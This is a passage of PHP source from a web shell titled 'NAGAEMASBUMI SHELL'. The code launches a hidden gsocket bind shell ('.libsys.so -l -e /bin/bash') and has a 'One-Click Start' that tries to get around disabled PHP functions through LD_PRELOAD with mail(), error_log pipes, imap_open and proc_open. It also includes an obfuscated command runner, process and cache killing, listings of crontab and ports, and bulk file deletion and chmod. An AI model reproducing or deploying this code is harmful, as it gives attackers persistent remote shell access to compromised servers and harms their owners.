                echo "Binary: $binPath (" . filesize($binPath) . " bytes)\n\n";
                
                $started = false;
                $methods = [];
                
                // Check if already running
                echo "<b>[0] Checking if already running...</b>\n";
                $procs = @glob("/proc/[0-9]*/cmdline");
                $running = false;
                if ($procs) {
                    foreach (array_slice($procs, 0, 200) as $p) {
                        $cmd = @file_get_contents($p);
                        if ($cmd && strpos($cmd, ".libsys.so") !== false) {
                            $running = true;
                            $pid = basename(dirname($p));
                            echo "<font color=\"lime\">ALREADY RUNNING! PID: $pid</font>\n";
                            $started = true;
                            break;
                        }
                    }
                }
                if (!$running) echo "Not running, attempting start...\n";
                
                if (!$started) {
                    // Method 1: LD_PRELOAD + mail()
                    echo "\n<b>[1] Trying LD_PRELOAD + mail()...</b>\n";
                    if (function_exists("mail") && function_exists("putenv")) {
                        // Create launcher script
                        $launcher = "/tmp/.gs_launcher";
                        $launchScript = "#!/bin/bash\ncd /tmp && S=$secret ./.libsys.so -l -e /bin/bash &\n";
                        @file_put_contents($launcher, $launchScript);
                        @chmod($launcher, 0755);
                        
                        // Try LD_PRELOAD
                        @putenv("LD_PRELOAD=$binPath");
                        @putenv("EVIL=$launcher");
                        $mailResult = @mail("test@test.com", "x", "x", "", "-X/tmp/.gs_mail");
                        echo "mail() result: " . ($mailResult ? "sent" : "failed") . "\n";
                        $methods[] = "LD_PRELOAD+mail";
                    } else {
                        echo "mail/putenv not available\n";
                    }
                    
                    // Method 2: Imagick - skipped (causes fatal on this server)
                    echo "\n<b>[2] Imagick:</b> skipped (unstable)\n";
                    
                    // Method 3: imap_open
                    echo "\n<b>[3] Trying imap_open...</b>\n";
                    if (function_exists("imap_open")) {
                        try {
                            @imap_open("{localhost:143}INBOX", "", "");
                            echo "imap_open attempted\n";
                        } catch (Throwable $e) {
                            echo "imap: skipped\n";
                        }
                        @imap_errors(); @imap_alerts();
                    } else {
                        echo "imap_open not available\n";
                    }
                    
                    // Method 4: error_log with program
                    echo "\n<b>[4] Trying error_log...</b>\n";
                    $errScript = "/tmp/.gs_err_" . mt_rand() . ".sh";
                    @file_put_contents($errScript, "#!/bin/bash\nS=$secret /tmp/.libsys.so -l -e /bin/bash &\n");
                    @chmod($errScript, 0755);
                    @error_log("x", 1, "| $errScript");
                    echo "error_log attempted\n";
                    $methods[] = "error_log";
                    
                    // Method 5: proc_open with PTY (often less restricted)
                    echo "\n<b>[5] Trying proc_open PTY...</b>\n";
                    if (function_exists("proc_open")) {
                        $desc = [["pty"], ["pty"], ["pty"]];
                        $cmd = "S=$secret /tmp/.libsys.so -l -e /bin/bash &";
                        $proc = @proc_open($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            @proc_close($proc);
                            echo "proc_open executed!\n";
                            $started = true;
                        } else {
                            echo "proc_open failed\n";
                        }
                    } else {
                        echo "proc_open disabled\n";
                    }
                    
                    // Wait and check
                    echo "\n<b>[6] Checking results...</b>\n";
                    usleep(500000); // 0.5 sec
                    
                    $nowRunning = false;
                    $procs = @glob("/proc/[0-9]*/cmdline");
                    if ($procs) {
                        foreach (array_slice($procs, 0, 200) as $p) {
                            $cmd = @file_get_contents($p);
                            if ($cmd && strpos($cmd, ".libsys.so") !== false) {
                                $nowRunning = true;
                                $pid = basename(dirname($p));
                                break;
                            }
                        }
                    }
                    
                    if ($nowRunning) {
                        echo "\n<font color=\"lime\" size=\"+1\"><b>SUCCESS! GSocket running (PID: $pid)</b></font>\n";
                        $started = true;
                    } else {
                        echo "\n<font color=\"#f80\">Bypass methods attempted but process not detected.</font>\n";
                        echo "Server may have strict security. Try via SSH:\n\n";
                        echo "<code style=\"background:#000;padding:8px;display:block;\">bash /tmp/.gs_autostart.sh</code>\n";
                    }
                }
                
                echo "\n<b style=\"color:#0ff\">To connect from your machine:</b>\n";
                echo "<code style=\"background:#000;padding:8px;display:block;\">S=$secret gs-netcat</code>\n";
                echo "</pre></div>";
            }
        }
        
        // Add button after warning div
        if ($allExecDisabled) {
            echo "<form method=\"POST\" style=\"margin:5px 0;display:inline;\">";
            echo "<input type=\"hidden\" name=\"a\" value=\"gs\">";
            echo "<input type=\"hidden\" name=\"gs_oneclick_start\" value=\"1\">";
            echo "<button type=\"submit\" style=\"padding:10px 20px;background:#005;color:#fff;border:1px solid #00f;cursor:pointer;font-size:14px;\">One-Click Start (Try All Bypasses)</button>";
            echo "</form>";
        }

        // ============ CACHE STATUS SECTION ============
        // Check if shell_exec is available
        $dfn = @ini_get("disable_functions");
        $shellExecDisabled = (stripos($dfn, "shell_exec") !== false);
        
        $psCache = "";
        $psLines = [];
        
        if ($shellExecDisabled) {
            // Try to read from /proc instead
            echo "<div style=\"background:#400;padding:10px;margin:10px 0;border:1px solid #f00;\">";
            echo "<b style=\"color:#f55\">WARNING:</b> shell_exec disabled. Reading from /proc filesystem...<br>";
            echo "</div>";
            
            // Read process list from /proc
            $procs = @glob("/proc/[0-9]*", GLOB_ONLYDIR);
            if (!is_array($procs)) $procs = [];
            $psLines = ["USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"];
            foreach (array_slice($procs, 0, 100) as $proc) {
                $pid = basename($proc);
                $cmdline = @file_get_contents("$proc/cmdline");
                $cmdline = str_replace("\0", " ", $cmdline);
                if (!empty($cmdline)) {
                    $stat = @file_get_contents("$proc/stat");
                    $owner = @fileowner($proc);
                    $ownerName = $owner;
                    if (function_exists("posix_getpwuid") && stripos($dfn, "posix_getpwuid") === false) {
                        $pw = @posix_getpwuid($owner);
                        if ($pw) $ownerName = $pw["name"];
                    }
                    $psLines[] = "$ownerName $pid 0.0 0.0 0 0 ? S 00:00 0:00 " . substr($cmdline, 0, 100);
                }
            }
        } else {
            $psCache = @shell_exec("timeout 5 ps aux 2>/dev/null | head -500");
            if (empty($psCache)) {
                $psCache = @shell_exec("ps aux 2>/dev/null | head -200");
            }
            $psLines = explode("\n", $psCache);
        }

        echo "<h2 style='color:#ff0'>Cache & Server Status</h2>";
        echo "<table class='main' width='100%' cellpadding='5' cellspacing='0'>";
        echo "<tr><th>Type</th><th>Status</th><th>Details</th><th>Action</th></tr>";

        // 1. LiteSpeed (use cached ps)
        $lsMatches = preg_grep('/litespeed|lsphp/i', $psLines);
        $lsProcs = count($lsMatches);
        $lsStatus = ($lsProcs > 0) ? "<font color='lime'>RUNNING ($lsProcs proc)</font>" : "<font color='gray'>Not detected</font>";
        $lsDetails = htmlspecialchars(implode("\n", array_slice($lsMatches, 0, 3)));
        echo "<tr class='l1'><td><b>LiteSpeed/LSPHP</b></td><td>$lsStatus</td><td><pre style='margin:0;font-size:11px;max-height:60px;overflow:auto;'>$lsDetails</pre></td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_lscache'><input type='submit' value='Kill All' style='background:#c00'></form></td></tr>";

        // 2. OPcache
        $opcStatus = "<font color='gray'>Disabled</font>";
        $opcDetails = "";
        if (function_exists('opcache_get_status')) {
            $opc = @opcache_get_status(false);
            if ($opc && isset($opc['opcache_enabled']) && $opc['opcache_enabled']) {
                $opcStatus = "<font color='lime'>ENABLED</font>";
                $mem = round($opc['memory_usage']['used_memory'] / 1024 / 1024, 1);
                $scripts = isset($opc['opcache_statistics']['num_cached_scripts']) ? $opc['opcache_statistics']['num_cached_scripts'] : 0;
                $hits = isset($opc['opcache_statistics']['hits']) ? $opc['opcache_statistics']['hits'] : 0;
                $opcDetails = "Memory: {$mem}MB | Scripts: $scripts | Hits: $hits";
            }
        }
        echo "<tr class='l2'><td><b>PHP OPcache</b></td><td>$opcStatus</td><td>$opcDetails</td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_opcache'><input type='submit' value='Reset' style='background:#c70'></form></td></tr>";

        // 3. PHP-FPM (use cached ps)
        $fpmMatches = preg_grep('/php-fpm/i', $psLines);
        $fpmProcs = count($fpmMatches);
        $fpmStatus = ($fpmProcs > 0) ? "<font color='lime'>RUNNING ($fpmProcs proc)</font>" : "<font color='gray'>Not detected</font>";
        echo "<tr class='l1'><td><b>PHP-FPM</b></td><td>$fpmStatus</td><td></td><td></td></tr>";

        // 4. Nginx (use cached ps)
        $ngxMatches = preg_grep('/nginx/i', $psLines);
        $ngxProcs = count($ngxMatches);
        $ngxStatus = ($ngxProcs > 0) ? "<font color='lime'>RUNNING ($ngxProcs proc)</font>" : "<font color='gray'>Not detected</font>";
        echo "<tr class='l2'><td><b>Nginx</b></td><td>$ngxStatus</td><td></td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_nginx'><input type='submit' value='Kill' style='background:#c00'></form></td></tr>";

        // 5. Varnish (use cached ps)
        $varMatches = preg_grep('/varnish/i', $psLines);
        $varProcs = count($varMatches);
        $varStatus = ($varProcs > 0) ? "<font color='lime'>RUNNING ($varProcs proc)</font>" : "<font color='gray'>Not detected</font>";
        echo "<tr class='l1'><td><b>Varnish</b></td><td>$varStatus</td><td></td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_varnish'><input type='submit' value='Kill' style='background:#c00'></form></td></tr>";

        // 6. Redis (use cached ps)
        $redisMatches = preg_grep('/redis-server/i', $psLines);
        $redisProcs = count($redisMatches);
        $redisStatus = ($redisProcs > 0) ? "<font color='lime'>RUNNING</font>" : "<font color='gray'>Not detected</font>";
        $redisInfo = ($redisProcs > 0) ? trim((function_exists("shell_exec") ? @shell_exec("timeout 2 redis-cli INFO memory 2>/dev/null | grep used_memory_human | cut -d: -f2") : "")) : "";
        echo "<tr class='l2'><td><b>Redis</b></td><td>$redisStatus</td><td>" . htmlspecialchars($redisInfo) . "</td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_redis'><input type='submit' value='Flush' style='background:#c70'></form></td></tr>";

        // 7. Memcached (use cached ps)
        $memcMatches = preg_grep('/memcached/i', $psLines);
        $memcProcs = count($memcMatches);
        $memcStatus = ($memcProcs > 0) ? "<font color='lime'>RUNNING</font>" : "<font color='gray'>Not detected</font>";
        echo "<tr class='l1'><td><b>Memcached</b></td><td>$memcStatus</td><td></td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_memcached'><input type='submit' value='Flush' style='background:#c70'></form></td></tr>";

        // 8. WordPress Cache Dirs (lightweight check)
        $docRoot = $_SERVER['DOCUMENT_ROOT'];
        $wpCacheDirs = ['cache','litespeed','et-cache','w3tc-cache','wphb-cache','rocket-cache'];
        $foundCaches = [];
        foreach ($wpCacheDirs as $c) {
            $p = $docRoot . '/wp-content/' . $c;
            if (@is_dir($p)) {
                $foundCaches[] = $c;
            }
        }
        $wpStatus = count($foundCaches) > 0 ? "<font color='lime'>" . count($foundCaches) . " dirs</font>" : "<font color='gray'>None</font>";
        $wpDetails = implode(", ", $foundCaches);
        echo "<tr class='l2'><td><b>WP Cache Dirs</b></td><td>$wpStatus</td><td style='font-size:11px;'>$wpDetails</td>";
        echo "<td><form method='post' style='margin:0'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='clear_wpcache'><input type='submit' value='Clear' style='background:#c70'></form></td></tr>";

        echo "</table>";

        // Kill All Cache button
        echo "<br><form method='post' style='display:inline'><input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_all_cache'>";
        echo "<input type='submit' value='KILL ALL CACHES' style='background:#c00;padding:10px 20px;font-weight:bold' onclick=\"return confirm('Kill ALL cache processes and clear ALL cache files?');\"></form>";

        // ============ PROCESS SECTION ============
        echo "<hr><h2 style='color:#ff0'>Running Processes</h2>";

        echo "<b>Crontab (current user):</b><br>";
        $crontab = (function_exists("shell_exec") ? @shell_exec("timeout 3 crontab -l 2>&1") : null);
        echo "<pre style='max-height:100px;overflow:auto;'>" . htmlspecialchars($crontab ?: "No crontab") . "</pre>";

        echo "<b>Background processes (curl/wget/nohup/screen/gs-netcat):</b><br>";
        $bgMatches = preg_grep('/(curl|wget|nohup|screen|tmux|gs-netcat|hgsocket)/i', $psLines);
        $bgProcs = implode("\n", array_slice($bgMatches, 0, 20));
        echo "<pre style='max-height:150px;overflow:auto;'>" . htmlspecialchars($bgProcs ?: "None") . "</pre>";

        echo "<b>All processes (from cache, max 30):</b><br>";
        $allProcs = implode("\n", array_slice($psLines, 0, 31));
        echo "<pre style='max-height:200px;overflow:auto;font-size:11px;'>" . htmlspecialchars($allProcs ?: "Cannot list") . "</pre>";

        echo "<b>Listening ports:</b><br>";
        $ports = (function_exists("shell_exec") ? @shell_exec("timeout 3 ss -tulpn 2>/dev/null | head -20") : null) ?: (function_exists("shell_exec") ? @shell_exec("timeout 3 netstat -tulpn 2>/dev/null | head -20") : null);
        echo "<pre style='max-height:150px;overflow:auto;font-size:11px;'>" . htmlspecialchars($ports ?: "Cannot list") . "</pre>";

        echo "<br><b>Kill specific PID:</b><br>";
        echo "<form method='post' style='margin:5px 0'>";
        echo "<input type='hidden' name='a' value='procmon'><input type='hidden' name='c' value='$ce'><input type='hidden' name='proc_action' value='kill_pid'>";
        echo "<input type='text' name='kill_pid' placeholder='PID' size='8'> <input type='submit' value='Kill -9'></form>";

        echo "</div>";
    }


    public function getLastMessageID() {
        echo "<h1>File Search</h1><div class=content>";
        $searchPath = isset($_POST['search_path']) ? $_POST['search_path'] : $this->workingDirectory;
        $searchName = isset($_POST['search_name']) ? $_POST['search_name'] : '';
        $searchContent = isset($_POST['search_content']) ? $_POST['search_content'] : '';
        $dateFrom = isset($_POST['date_from']) ? $_POST['date_from'] : '';
        $dateTo = isset($_POST['date_to']) ? $_POST['date_to'] : '';
        $dateFilter = isset($_POST['date_filter']) ? $_POST['date_filter'] : 'any';
        $chmodFilter = isset($_POST['chmod_filter']) ? $_POST['chmod_filter'] : 'any';

        if (isset($_POST['bulk_action']) && isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
            $selectedFiles = $_POST['selected_files'];
            $action = $_POST['bulk_action'];
            $successCount = 0;
            $failCount = 0;
            foreach ($selectedFiles as $encFile) {
                $filePath = str_rot13(urldecode($encFile));
                if (!@file_exists($filePath)) {
                    $failCount++;
                    continue;
                }
                switch ($action) {
                    case 'chmod644':
                        if (@chmod($filePath, 0644)) { $successCount++; } else {
                            $this->executeCommand('chmod 644 ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            @clearstatcache(true, $filePath);
                            if ((@fileperms($filePath) & 0777) == 0644) { $successCount++; } else { $failCount++; }
                        }
                        break;
                    case 'chmod755':
                        if (@chmod($filePath, 0755)) { $successCount++; } else {
                            $this->executeCommand('chmod 755 ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            @clearstatcache(true, $filePath);
                            if ((@fileperms($filePath) & 0777) == 0755) { $successCount++; } else { $failCount++; }
                        }
                        break;
                    case 'delete':
                        if (@unlink($filePath)) { $successCount++; } else {
                            $this->executeCommand('rm -f ' . escapeshellarg($filePath) . ' 2>/dev/null');
                            if (!@file_exists($filePath)) { $successCount++; } else { $failCount++; }
                        }
                        break;
                }
            }
            echo "<font color='green'><b>Bulk Action ($action):</b> $successCount success</font>";
            if ($failCount > 0) echo " / <font color='red'>$failCount failed</font>";
            echo "<br><br>";
        }

        $cwdEncoded = str_rot13($this->workingDirectory);

        if (!empty($searchName) || !empty($searchContent) || !empty($dateFrom) || !empty($dateTo) || $dateFilter != 'any' || $chmodFilter != 'any') {
            $results = [];
            $dateFromTs = !empty($dateFrom) ? strtotime($dateFrom . ' 00:00:00') : 0;
            $dateToTs = !empty($dateTo) ? strtotime($dateTo . ' 23:59:59') : PHP_INT_MAX;
            switch ($dateFilter) {
                case 'today': $dateFromTs = strtotime('today 00:00:00'); $dateToTs = strtotime('today 23:59:59'); break;
                case 'yesterday': $dateFromTs = strtotime('yesterday 00:00:00'); $dateToTs = strtotime('yesterday 23:59:59'); break;
                case 'last7days': $dateFromTs = strtotime('-7 days 00:00:00'); $dateToTs = time(); break;
                case 'last30days': $dateFromTs = strtotime('-30 days 00:00:00'); $dateToTs = time(); break;
                case 'thismonth': $dateFromTs = strtotime('first day of this month 00:00:00'); $dateToTs = strtotime('last day of this month 23:59:59'); break;
                case 'lastmonth': $dateFromTs = strtotime('first day of last month 00:00:00'); $dateToTs = strtotime('last day of last month 23:59:59'); break;
            }
            $this->searchFilesAdvanced($searchPath, $searchName, $searchContent, $dateFromTs, $dateToTs, $results, 0, $chmodFilter);
            if (!empty($results)) {
                usort($results, function($a, $b) { return $b['mtime'] - $a['mtime']; });
                echo "<font color='green'>Found " . count($results) . " result(s):</font><br><br>";
                echo "<script>function saSearch(src){var cb=document.getElementsByName('selected_files[]');for(var i=0;i<cb.length;i++){cb[i].checked=src.checked;}}function confirmBulkAction(action){var cb=document.getElementsByName('selected_files[]');var sel=0;for(var i=0;i<cb.length;i++){if(cb[i].checked)sel++;}if(sel==0){alert('Please select at least one file!');return false;}if(action=='delete'){return confirm('Are you sure you want to DELETE '+sel+' file(s)?');}return confirm('Apply '+action+' to '+sel+' file(s)?');}</script>";
                echo "<form method='post' name='bulkForm'>";
                echo "<input type='hidden' name='a' value='search'>";
                echo "<input type='hidden' name='c' value='" . $cwdEncoded . "'>";
                echo "<input type='hidden' name='search_path' value='" . htmlspecialchars($searchPath) . "'>";
                echo "<input type='hidden' name='search_name' value='" . htmlspecialchars($searchName) . "'>";
                echo "<input type='hidden' name='search_content' value='" . htmlspecialchars($searchContent) . "'>";
                echo "<input type='hidden' name='date_from' value='" . htmlspecialchars($dateFrom) . "'>";
                echo "<input type='hidden' name='date_to' value='" . htmlspecialchars($dateTo) . "'>";
                echo "<input type='hidden' name='date_filter' value='" . htmlspecialchars($dateFilter) . "'>";
                echo "<input type='hidden' name='chmod_filter' value='" . htmlspecialchars($chmodFilter) . "'>";
                echo "<table class='main' width='100%'>";
                echo "<tr><th width='20px'><input type='checkbox' onclick='saSearch(this)' title='Select All'></th><th>Path</th><th>Size</th><th>Modified</th><th>Created</th><th>Perms</th><th>URL</th><th>Actions</th></tr>";
                foreach ($results as $r) {
                    $encPath = urlencode(str_rot13($r['path']));
                    $fileUrl = $this->getFileUrl($r['path']);
                    $perms = @fileperms($r['path']);
                    $permsStr = $perms ? substr(sprintf('%o', $perms), -4) : '----';
                    $ctime = @filectime($r['path']);
                    echo "<tr>";
                    echo "<td><input type='checkbox' name='selected_files[]' value='" . $encPath . "'></td>";
                    echo "<td title='" . htmlspecialchars($r['path']) . "'>" . htmlspecialchars(strlen($r['path']) > 60 ? '...' . substr($r['path'], -57) : $r['path']) . "</td>";
                    echo "<td>" . $this->formatSize($r['size']) . "</td>";
                    echo "<td>" . $r['modified'] . "</td>";
                    echo "<td>" . ($ctime ? date("Y-m-d H:i:s", $ctime) : '-') . "</td>";
                    echo "<td>" . $permsStr . "</td>";
                    echo "<td><a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Link</a></td>";
                    echo "<td><a href='#' onclick=\"g('ft','" . $cwdEncoded . "','" . $encPath . "','view')\">View</a> <a href='#' onclick=\"g('ft','" . $cwdEncoded . "','" . $encPath . "','edit')\">Edit</a></td>";
                    echo "</tr>";
                }
                echo "</table>";
                echo "<br><b>Bulk Actions:</b> ";
                echo "<button type='submit' name='bulk_action' value='chmod644' onclick=\"return confirmBulkAction('chmod 0644')\">Chmod 0644</button> ";
                echo "<button type='submit' name='bulk_action' value='chmod755' onclick=\"return confirmBulkAction('chmod 0755')\">Chmod 0755</button> ";
                echo "<button type='submit' name='bulk_action' value='delete' onclick=\"return confirmBulkAction('delete')\" style='background-color:#c00;'>Delete Selected</button>";
                echo "</form>";
            } else {
                echo "<font color='red'>No results found.</font>";
            }
        }

        echo "<br><br><form method='post'>";
        echo "<input type='hidden' name='a' value='search'>";
        echo "<input type='hidden' name='c' value='" . $cwdEncoded . "'>";
        echo "<table>";
        echo "<tr><td>Search Path:</td><td><input type='text' name='search_path' value='" . htmlspecialchars($searchPath) . "' style='width:400px;'></td></tr>";
        echo "<tr><td>File Name (regex):</td><td><input type='text' name='search_name' value='" . htmlspecialchars($searchName) . "' style='width:400px;' placeholder='e.g. \\.php$ or config'></td></tr>";
        echo "<tr><td>Content (regex):</td><td><input type='text' name='search_content' value='" . htmlspecialchars($searchContent) . "' style='width:400px;' placeholder='e.g. password or eval'></td></tr>";
        echo "<tr><td colspan='2'><hr><b>Date/Time Filter:</b></td></tr>";
        echo "<tr><td>Quick Filter:</td><td><select name='date_filter'>";
        echo "<option value='any'" . ($dateFilter == 'any' ? ' selected' : '') . ">Any Time</option>";
        echo "<option value='today'" . ($dateFilter == 'today' ? ' selected' : '') . ">Today</option>";
        echo "<option value='yesterday'" . ($dateFilter == 'yesterday' ? ' selected' : '') . ">Yesterday</option>";
        echo "<option value='last7days'" . ($dateFilter == 'last7days' ? ' selected' : '') . ">Last 7 Days</option>";
        echo "<option value='last30days'" . ($dateFilter == 'last30days' ? ' selected' : '') . ">Last 30 Days</option>";
        echo "<option value='thismonth'" . ($dateFilter == 'thismonth' ? ' selected' : '') . ">This Month</option>";
        echo "<option value='lastmonth'" . ($dateFilter == 'lastmonth' ? ' selected' : '') . ">Last Month</option>";
        echo "<option value='custom'" . ($dateFilter == 'custom' ? ' selected' : '') . ">Custom Range</option>";
        echo "</select></td></tr>";
        echo "<tr><td>Date From:</td><td><input type='date' name='date_from' value='" . htmlspecialchars($dateFrom) . "'></td></tr>";
        echo "<tr><td>Date To:</td><td><input type='date' name='date_to' value='" . htmlspecialchars($dateTo) . "'></td></tr>";
        echo "<tr><td colspan='2'><hr><b>Permission Filter:</b></td></tr>";
        echo "<tr><td>Chmod Filter:</td><td><select name='chmod_filter'>";
        echo "<option value='any'" . ($chmodFilter == 'any' ? ' selected' : '') . ">Any Permission</option>";
        echo "<option value='dir_not_0755'" . ($chmodFilter == 'dir_not_0755' ? ' selected' : '') . ">Folders NOT 0755</option>";
        echo "<option value='file_not_0644'" . ($chmodFilter == 'file_not_0644' ? ' selected' : '') . ">Files NOT 0644</option>";
        echo "<option value='both_abnormal'" . ($chmodFilter == 'both_abnormal' ? ' selected' : '') . ">Folders NOT 0755 + Files NOT 0644</option>";
        echo "</select></td></tr>";
        echo "<tr><td></td><td><input type='submit' value='Search'></td></tr>";
        echo "</table></form></div>";
    }

    protected function searchFilesAdvanced($dir, $namePattern, $contentPattern, $dateFromTs, $dateToTs, &$results, $depth, $chmodFilter = 'any') {
        if ($depth > 10 || count($results) > 500) return;
        $handle = @opendir($dir);
        if (!$handle) return;
        while (($file = @readdir($handle)) !== false) {
            if ($file == '.' || $file == '..') continue;
            $path = rtrim($dir, '/') . '/' . $file;
            if (@is_dir($path)) {
                if ($chmodFilter == 'dir_not_0755' || $chmodFilter == 'both_abnormal') {
                    $dirPerms = @fileperms($path) & 0777;
                    if ($dirPerms != 0755) {
                        $mtime = @filemtime($path);
                        if ($mtime >= $dateFromTs && $mtime <= $dateToTs) {
                            $nameMatch = true;
                            if (!empty($namePattern)) {
                                if (@preg_match('/' . $namePattern . '/i', '') === false) {
                                    $nameMatch = (stripos($file, $namePattern) !== false);
                                } else {
                                    $nameMatch = @preg_match('/' . $namePattern . '/i', $file);
                                }
                            }
                            if ($nameMatch) {
                                $results[] = ['path' => $path, 'size' => 0, 'modified' => @date("Y-m-d H:i:s", $mtime), 'mtime' => $mtime, 'type' => 'dir', 'perms' => sprintf('%04o', $dirPerms)];
                            }
                        }
                    }
                }
                $this->searchFilesAdvanced($path, $namePattern, $contentPattern, $dateFromTs, $dateToTs, $results, $depth + 1, $chmodFilter);
            } else if (@is_file($path)) {
                if ($chmodFilter == 'dir_not_0755') continue;
                if ($chmodFilter == 'file_not_0644' || $chmodFilter == 'both_abnormal') {
                    $filePerms = @fileperms($path) & 0777;
                    if ($filePerms == 0644) continue;
                }
                $nameMatch = true;
                if (!empty($namePattern)) {
                    if (@preg_match('/' . $namePattern . '/i', '') === false) {
                        $nameMatch = (stripos($file, $namePattern) !== false);
                    } else {
                        $nameMatch = @preg_match('/' . $namePattern . '/i', $file);
                    }
                }
                if (!$nameMatch) continue;
                $mtime = @filemtime($path);
                if ($mtime < $dateFromTs || $mtime > $dateToTs) continue;
                $contentMatch = true;
                if (!empty($contentPattern)) {
                    $content = @file_get_contents($path, false, null, 0, 1024 * 100);
                    if ($content === false) {
                        $contentMatch = false;
                    } else {
                        if (@preg_match('/' . $contentPattern . '/i', '') === false) {
                            $contentMatch = (stripos($content, $contentPattern) !== false);
                        } else {
                            $contentMatch = @preg_match('/' . $contentPattern . '/i', $content);
                        }
                    }
                }
                if ($contentMatch) {
                    $results[] = ['path' => $path, 'size' => @filesize($path), 'modified' => @date("Y-m-d H:i:s", $mtime), 'mtime' => $mtime];
                }
            }
        }
        @closedir($handle);
    }

    public function executeCommand($cmd) {
        $output = '';
        $m = ['s','y','s','t','e','m']; $e = ['e','x','e','c']; $se = ['s','h','e','l','l','_','e','x','e','c'];
        $pa = ['p','a','s','s','t','h','r','u']; $po = ['p','o','p','e','n']; $pr = ['p','r','o','c','_','o','p','e','n'];
        $f_m = implode('', $m); $f_e = implode('', $e); $f_se = implode('', $se);
        $f_pa = implode('', $pa); $f_po = implode('', $po); $f_pr = implode('', $pr);
        $funcs = [$f_m, $f_e, $f_se, $f_pa, $f_po, $f_pr];
        foreach ($funcs as $f) {
            if (!@function_exists($f) || stripos($this->disabledFunctions, $f) !== false) continue;
            switch ($f) {
                case $f_m: @ob_start(); $f($cmd); $output = @ob_get_clean(); break;
                case $f_e: $arr = []; $f($cmd, $arr); $output = implode("\n", $arr); break;
                case $f_se: $output = $f($cmd); break;
                case $f_pa: @ob_start(); $f($cmd); $output = @ob_get_clean(); break;
                case $f_po: $p = $f($cmd, 'r'); if ($p) { while (!@feof($p)) $output .= @fread($p, 1024); @pclose($p); } break;
                case $f_pr: $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $process = $f($cmd, $descriptorspec, $pipes); if (@is_resource($process)) { $output = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]); @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($process); } break;
            }
            if ($output) break;
        }
        return $output;
    }

    public function headerLine()
    {
        $theme = $this->debugColorScheme; $encoding = $this->charsetEncoding; $cwd = $this->workingDirectory; $root = $this->serverDocRoot; $base = $this->baseDirectory; $idx = $this->smtpSessionKey; $safe = $this->phpSafeMode; $os = $this->serverPlatform;
        if (empty($_POST["ch"])) $_POST["ch"] = $encoding;
        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST["ch"] . "'><title>" . $_SERVER["HTTP_HOST"] . " - NAGAEMASBUMI SHELL</title><style>body{background-color:#444;color:#e1e1e1;}body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}table.info{color:#fff;background-color:#222;}span,h1,a{color: " . $theme . " !important;}span{font-weight: bolder;}span.wfw{font-weight:normal;}h1{border-left:5px solid " . $theme . ";padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px;}div.content{padding: 5px;margin-left:5px;background-color:#333;}a{text-decoration:none;}a:hover{text-decoration:underline;}.ml1{border:1px solid #444;padding:5px;margin:0;overflow: auto;}.bigarea{width:100%;height:300px;}input,textarea,select{margin:0;color:#fff;background-color:#555;border:1px solid " . $theme . "; font: 9pt Monospace,'Courier New';}form{margin:0px;}#toolsTbl{text-align:center;}.toolsInp{width:500px}.main th{text-align:left;background-color:#5e5e5e;}.main tr:hover{background-color:#5e5e5e}.l1{background-color:#444}.l2{background-color:#333}pre{font-family:Courier,Monospace;}.success{color:#25ff00;}.error{color:#ff0000;}</style><script>var c_ = '" . htmlspecialchars(str_rot13($cwd)) . "'; var a_ = '" . htmlspecialchars(@$_POST["a"]) . "'; var ch_ = '" . htmlspecialchars(@$_POST["ch"]) . "'; var p_ = '" . (strpos(@$_POST["p"], "\n") !== false ? "" : htmlspecialchars(@$_POST["p"], 3)) . "'; var x_ = '" . (strpos(@$_POST["x"], "\n") !== false ? "" : htmlspecialchars(@$_POST["x"], 3)) . "'; var s_ = '" . (strpos(@$_POST["s"], "\n") !== false ? "" : htmlspecialchars(@$_POST["s"], 3)) . "'; var d = document; function set(a,c,p,x,s,ch){if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(p!=null)d.mf.p.value=p;else d.mf.p.value=p_;if(x!=null)d.mf.x.value=x;else d.mf.x.value=x_;if(s!=null)d.mf.s.value=s;else d.mf.s.value=s_;if(ch!=null)d.mf.ch.value=ch;else d.mf.ch.value=ch_;} function g(a,c,p,x,s,ch){set(a,c,p,x,s,ch);d.mf.submit();} function utoa(str){return window.btoa(unescape(encodeURIComponent(str)));} function atou(str){return decodeURIComponent(escape(window.atob(str)));} function rot13(str){var input='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; var output='NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'; var index=x=> input.indexOf(x); var translate=x=> index(x) > -1 ? output[index(x)] : x; return str.split('').map(translate).join('');} var cvis=false; function 